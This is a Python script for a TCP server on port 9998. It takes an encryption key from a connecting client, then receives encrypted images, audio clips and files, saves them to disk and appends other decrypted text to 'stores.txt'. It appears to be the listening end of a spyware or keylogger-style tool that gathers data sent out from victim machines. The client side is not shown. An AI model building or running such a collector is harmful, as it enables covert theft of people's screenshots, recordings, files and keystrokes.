import socket
from cryptography.fernet import Fernet

A = 9998




def create_socket():
	try:
		global host
		global port
		global s
		host = ""
		port = A
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

	except socket.error as e:
		print("socket creation error" + str(e))


def bind_socket():
	try:
		global host
		global port
		global s
		s.bind((host,port))
		print("Binding to the post : "+str(port))
		s.listen(5)

	except socket.error as e:
		print("Socket Binding error "+"\n"+'Retrying ...')
		bind_socket()


def send_command(conn):
		while True:
		#using infinte we can send more than one command
				try :
					client_response = str(conn.recv(256456),"utf-8")
					print(client_response)
					if client_response == "Disconnect":
						print("Disconnecting from Client")
						break

					elif client_response[0:5] == "Image":
						index = client_response.index("^")
						size = int(client_response[5:index])
						file_name = client_response[index + 1:]
						print(size)
						print(file_name)
						client_response = conn.recv(256456)
						print(client_response)
						f = Fernet(key)
						a = f.decrypt(client_response)
						print(a)
						with open(file_name, 'wb') as fd:
							fd.write(a)
					elif client_response[0:5] == "Audio":
						index = client_response.index("^")
						size = int(client_response[5:index])
						file_name = client_response[index + 1:]
						print(size)
						print(file_name,"*/*/*")
						client_response = conn.recv(2097152)
						print(len(client_response))
						f = Fernet(key)
						#a = f.decrypt(client_response)
						a = client_response
						print(a)
						with open(file_name, 'wb') as fd:
							fd.write(a)
						print("-----------------------------")
					else:
						client_response = str.encode(client_response)
						f = Fernet(key)
						a = f.decrypt(client_response)
						client_response = str(a, 'utf-8')

						if client_response[0:4] == "File":
							client_response = client_response[4:]
							index = client_response.index('^')
							file_name = client_response[0:index]
							client_response = client_response[index+1:]
							print(file_name,"*")
							with open(file_name,'w') as f:
								f.write(client_response)
							#print(client_response)


						else:
							with open("stores.txt",'a') as fa:
								fa.write(client_response+"\n")
				except:
					continue

def socket_accept():
	global key
	conn , address = s.accept()
	print("Connection has been established! \n"+"IP : " + address[0] + " | Port Number : " + str(address[1]))
	key = str(conn.recv(1024),"utf-8")
	print(key)
	send_command(conn)
	#print(key)
	conn.close()



#main function
def main():
	create_socket()
	bind_socket()
	socket_accept()

main()

